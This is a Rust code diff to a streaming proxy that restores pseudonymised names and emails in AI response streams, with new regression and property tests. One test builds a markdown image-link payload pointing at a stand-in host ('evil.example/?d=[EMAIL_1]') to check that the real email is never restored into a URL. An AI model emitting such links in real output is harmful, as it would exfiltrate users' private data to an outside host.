@@ -191,6 +191,9 @@ struct Sniff {
     emitted: usize,
 }
 
+/// Whitespace between JSON tokens.
+const JSON_WS: [char; 4] = [' ', '\t', '\n', '\r'];
+
 /// What a streamed text is.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum TextKind {
@@ -206,7 +209,9 @@ enum TextKind {
 /// first [`SNIFF_MAX`] bytes are read, so the answer never depends on how
 /// the text was split.
 fn sniff_text(text: &str, end: bool) -> Option<TextKind> {
-    let t = text.trim_start_matches('\u{feff}').trim_start();
+    let t = text
+        .trim_start_matches('\u{feff}')
+        .trim_start_matches(JSON_WS);
     if !t.starts_with(['{', '[']) {
         return (end || !t.is_empty()).then_some(TextKind::Plain);
     }
@@ -321,6 +326,29 @@ impl TextRestorer {
             TextRestorer::Plain(r) => r.pending_len(),
             TextRestorer::Json(r) => r.pending_len(),
             TextRestorer::Sniff(s) => s.seen.len() - s.emitted,
+        }
+    }
+
+    fn is_sniffing(&self) -> bool {
+        matches!(self, TextRestorer::Sniff(_))
+    }
+
+    /// `text` went out without this restorer (restored on its own): context
+    /// for what comes next. Nothing is held back after it.
+    fn skip(&mut self, text: &str) {
+        match self {
+            TextRestorer::Plain(r) => r.skip(text),
+            TextRestorer::Json(r) => {
+                let _ = r.push(text);
+                let _ = r.finish();
+            }
+            TextRestorer::Sniff(s) => {
+                s.seen.push_str(text);
+                s.emitted = s.seen.len();
+                if let Some(kind) = sniff_text(&s.seen, false) {
+                    let _ = self.decide(kind);
+                }
+            }
         }
     }
 }
@@ -755,15 +783,30 @@ enum JsonIn {
     Text,
 }
 
+/// Does `v` hold a string or an object anywhere?
+fn holds_text(v: &Value) -> bool {
+    match v {
+        Value::String(_) | Value::Object(_) => true,
+        Value::Array(items) => items.iter().any(holds_text),
+        _ => false,
+    }
+}
+
 fn json_in(s: &str) -> JsonIn {
-    let t = s.trim_start_matches('\u{feff}').trim();
+    let t = s.trim_start_matches('\u{feff}').trim_matches(JSON_WS);
     if !t.starts_with(['{', '[']) {
         return JsonIn::Text;
     }
     if let Ok(v) = parda_wire::body::parse_json(t.as_bytes())
         && (v.is_object() || v.is_array())
     {
-        return JsonIn::Container(v);
+        // Brackets and numbers only (`[1]`) hold nothing to restore and
+        // read as text (a citation, a list marker).
+        return if holds_text(&v) {
+            JsonIn::Container(v)
+        } else {
+            JsonIn::Text
+        };
     }
     match json_start(t) {
         JsonStart::Clear => JsonIn::Incomplete,
@@ -1364,9 +1407,12 @@ enum Kind {
 struct Track {
     restorer: TextRestorer,
     kind: Kind,
-    /// [`Kind::Auto`]: the previous value as it came, and as it went out.
+    /// [`Kind::Auto`]: the previous value as it came, and as it went out;
+    /// `prev_clean`: whether that output is the previous value's own (no
+    /// text held back before it went into it).
     prev_raw: String,
     prev_out: String,
+    prev_clean: bool,
     /// The last raw text pushed (what the restorer may be holding back is a
     /// suffix of it).
     recent: String,
@@ -1401,6 +1447,29 @@ fn held_tag_is_complete(engine: &Engine, scope: &str, track: &Track) -> bool {
     }
     let tail = &track.recent[start..];
     engine.restore(tail, scope) != tail
+}
+
+/// Can what `track` holds back, followed by `value`, still form a surrogate
+/// (so `value` goes on from it)?
+fn held_joins(engine: &Engine, scope: &str, track: &Track, value: &str) -> bool {
+    let held = track.restorer.pending_len();
+    if held == 0 || held > track.recent.len() {
+        return true;
+    }
+    let mut start = track.recent.len() - held;
+    while !track.recent.is_char_boundary(start) {
+        start += 1;
+    }
+    let tail = &track.recent[start..];
+    // A surrogate is short: the start of the value tells.
+    let mut cut = value.len().min(256);
+    while !value.is_char_boundary(cut) {
+        cut -= 1;
+    }
+    let probe = &value[..cut];
+    let mut r = engine.stream_restorer(scope);
+    let out = r.push(&format!("{tail}{probe}"));
+    r.pending_len() > probe.len() || !out.starts_with(tail)
 }
 
 /// The per-stream state shared by SSE and NDJSON.
@@ -1947,6 +2016,7 @@ impl Events {
             kind,
             prev_raw: String::new(),
             prev_out: String::new(),
+            prev_clean: true,
             recent: String::new(),
             last: None,
             used: *uses,
@@ -1954,28 +2024,35 @@ impl Events {
         track.used = *uses;
         let whole_json = matches!(track.kind, Kind::Auto) || (track.kind == Kind::Patch && fresh);
         let whole = if whole_json { json_in(s) } else { JsonIn::Text };
-        if let JsonIn::Invalid = whole {
-            // Clearly JSON that can never parse: left alone, never restored
-            // as text.
-            return false;
-        }
-        if let JsonIn::Container(_) = whole {
+        if matches!(whole, JsonIn::Container(_) | JsonIn::Invalid) {
             // A JSON document in a string, sent whole: restored at its own
-            // level, never spliced into as text. A patch path's appends that
-            // follow go on as JSON text.
+            // level (left alone if it can never parse), never spliced into
+            // as text. A patch path's appends that follow go on as JSON text.
             if track.kind == Kind::Patch {
                 track.restorer = TextRestorer::json(engine, scope);
                 let _ = track.restorer.push(s);
+                return restore_string(engine, scope, s, 0);
             }
-            return restore_string(engine, scope, s, 0);
+            return self.push_whole(key, seq, s);
         }
+        // A value that extends the previous one is a snapshot of the whole
+        // text so far. One equal to it is too, unless that could lose text:
+        // while text is held back, or when the previous output carried text
+        // held back from before it (then it is a delta that repeats).
+        let held = track.restorer.pending_len();
         let snapshot = track.kind == Kind::Auto
             && !track.prev_raw.is_empty()
-            && s.starts_with(&track.prev_raw);
-        if track.kind == Kind::Auto && !snapshot && held_tag_is_complete(engine, scope, track) {
-            // A new value that does not extend the last one, while a whole
-            // tag is held back: the last value was complete (a title, a
-            // status line), so the tag goes back into it, not into this one.
+            && s.starts_with(&track.prev_raw)
+            && (s.len() > track.prev_raw.len() || (held == 0 && track.prev_clean));
+        if track.kind == Kind::Auto
+            && !snapshot
+            && held > 0
+            && !track.restorer.is_sniffing()
+            && (held_tag_is_complete(engine, scope, track) || !held_joins(engine, scope, track, s))
+        {
+            // A new value that does not extend the last one, while text is
+            // held back that this value cannot complete (or a whole tag): the
+            // held text goes back into the last value, not into this one.
             self.flush_key(key, seq);
             return self.push(key, seq, leaf, s, kind);
         }
@@ -1997,6 +2074,9 @@ impl Events {
         };
         if track.kind == Kind::Auto {
             self.retained -= track.prev_raw.len() + track.prev_out.len();
+            if !snapshot {
+                track.prev_clean = held == 0;
+            }
             track.prev_raw.clone_from(&raw);
             track.prev_out.clone_from(&out);
             self.retained += track.prev_raw.len() + track.prev_out.len();
@@ -2010,6 +2090,43 @@ impl Events {
         }
         let changed = out != raw;
         *s = out;
+        changed
+    }
+
+    /// An Auto track's value that is a whole JSON document (or JSON that can
+    /// never parse): restored on its own; its text still goes to the track
+    /// as context (a URL guard's state) and as its previous value.
+    fn push_whole(&mut self, key: &str, seq: u64, s: &mut String) -> bool {
+        let Some(track) = self.tracks.get(key) else {
+            return false;
+        };
+        let extends = !track.prev_raw.is_empty() && s.starts_with(&track.prev_raw);
+        if track.restorer.pending_len() > 0 && !extends {
+            // Held text from before belongs to the last value.
+            self.flush_key(key, seq);
+        }
+        let raw = s.clone();
+        let changed = restore_string(&self.engine, &self.scope, s, 0);
+        let Some(track) = self.tracks.get_mut(key) else {
+            return changed;
+        };
+        // What was held back is in this value's own output now.
+        let _ = track.restorer.finish();
+        let context = if extends {
+            &raw[track.prev_raw.len()..]
+        } else {
+            &raw[..]
+        };
+        track.restorer.skip(context);
+        track.recent.push_str(context);
+        keep_tail(&mut track.recent, 256);
+        self.retained -= track.prev_raw.len() + track.prev_out.len();
+        track.prev_raw.clone_from(&raw);
+        track.prev_out.clone_from(s);
+        track.prev_clean = true;
+        self.retained += track.prev_raw.len() + track.prev_out.len();
+        track.last = None;
+        self.pending.remove(key);
         changed
     }
 
@@ -2682,6 +2799,74 @@ mod tests {
             for n in [1, 5, 1000] {
                 let out = run(&e, "text/event-stream", body.as_bytes(), n);
                 assert_eq!(datas(&out).concat(), want, "{deltas:?} {n}");
+            }
+        }
+    }
+
+    /// The text of each `{"answer": {"text"}}` snapshot event.
+    fn snapshot_texts(out: &[u8]) -> Vec<String> {
+        events(out)
+            .iter()
+            .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
+            .filter_map(|v| v["answer"]["text"].as_str().map(str::to_string))
+            .collect()
+    }
+
+    fn snapshot_stream(snaps: &[&str]) -> Vec<u8> {
+        sse(&snaps
+            .iter()
+            .map(|t| (None, json!({"answer": {"text": t}, "step": 1}).to_string()))
+            .collect::<Vec<_>>())
+    }
+
+    /// Review finding: under an unknown key, a value that repeats the
+    /// previous one while text is held back is a delta, not a snapshot (no
+    /// text is lost), and a value that replaces the previous one gets its
+    /// own text, not the previous one's held tail.
+    #[test]
+    fn repeated_and_replacing_values_keep_their_text() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        for (deltas, want) in [
+            (vec!["x ", "[", "[", "y"], "x [[y"),
+            (vec!["a [", "a [", "b"], "a [a [b"),
+            (vec!["[", "[", "1]]"], "[[1]]"),
+            (vec!["[", "[", "NAME_1]", " ok"], "[Ravi Kumar ok"),
+            (vec!["Hi [NA", "ME_1]", "ME_1]"], "Hi Ravi KumarME_1]"),
+        ] {
+            for n in [1, 9, 10_000] {
+                let out = run(&e, "text/event-stream", &openai_stream(&deltas), n);
+                assert_eq!(openai_text(&out), want, "{deltas:?} {n}");
+            }
+        }
+        // A status line replaced by another.
+        let out = run(
+            &e,
+            "text/event-stream",
+            &snapshot_stream(&["Searching [NA", "Done"]),
+            7,
+        );
+        assert_eq!(snapshot_texts(&out), ["Searching [NA", "Done"]);
+    }
+
+    /// Found by the Auto chunking property: a delta that is a whole JSON
+    /// value (`[1]`, `["x"]`) was restored on its own and its text never
+    /// reached the track, so the `]:` of a reference definition it began
+    /// was missed by the URL guard of the delta after it.
+    #[test]
+    fn whole_json_values_are_context_for_what_follows() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        for deltas in [
+            vec![" \n[1]", ": [EMAIL_1]\n\n![a][1]"],
+            vec!["[\"x\"]", ": //evil.example/?d=[EMAIL_1]\n\n![a][\"x\"]"],
+            vec!["x [", "[\"x\"]", ": //e/?d=[EMAIL_1]"],
+        ] {
+            for n in [1, 1000] {
+                let out = run(&e, "text/event-stream", &openai_stream(&deltas), n);
+                let text = openai_text(&out);
+                assert!(!text.contains("ravi@"), "{deltas:?} {n}: {text}");
+                assert_eq!(text.replace("Ravi Kumar", "[NAME_1]"), deltas.concat());
             }
         }
     }
@@ -4036,8 +4221,49 @@ mod tests {
         e
     }
 
+    /// Pieces where none repeats or extends the one before it: under an
+    /// unknown key those read as deltas whatever the format.
+    fn unambiguous_deltas(pieces: &[String]) -> bool {
+        pieces
+            .windows(2)
+            .all(|w| w[0].is_empty() || !w[1].starts_with(w[0].as_str()))
+    }
+
     proptest! {
         #![proptest_config(ProptestConfig::with_cases(512))]
+
+        /// Unknown keys (Kind::Auto): OpenAI-shaped deltas and cumulative
+        /// snapshots restore exactly under any split and chunking.
+        #[test]
+        fn auto_restore_under_any_chunking_equals_whole_text_restore(
+            text in arb_text(),
+            cuts in proptest::collection::vec(0usize..200, 0..8),
+            chunk in 1usize..40,
+        ) {
+            prop_assume!(sniff_text(&text, true) == Some(TextKind::Plain));
+            let e = shared_engine();
+            let mut whole = Guarded::new(e.stream_restorer(SCOPE).url_safe());
+            let mut want = whole.push(&text);
+            want.push_str(&whole.finish());
+            let pieces = split_at(&text, &cuts);
+            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
+            if unambiguous_deltas(&pieces) {
+                let out = run(e, "text/event-stream", &openai_stream(&refs), chunk);
+                prop_assert_eq!(openai_text(&out), want.clone());
+            }
+            // Snapshots that grow (an equal one, while text is held back,
+            // reads as a delta that repeats).
+            let mut snaps = Vec::new();
+            let mut acc = String::new();
+            for p in pieces.iter().filter(|p| !p.is_empty()) {
+                acc.push_str(p);
+                snaps.push(acc.clone());
+            }
+            let refs: Vec<&str> = snaps.iter().map(String::as_str).collect();
+            let out = run(e, "text/event-stream", &snapshot_stream(&refs), chunk);
+            let texts = snapshot_texts(&out);
+            prop_assert_eq!(texts.last().cloned().unwrap_or_default(), want);
+        }
 
         /// For any split of the answer into events and any chunking of the
         /// stream, the client's text equals restoring the whole text.
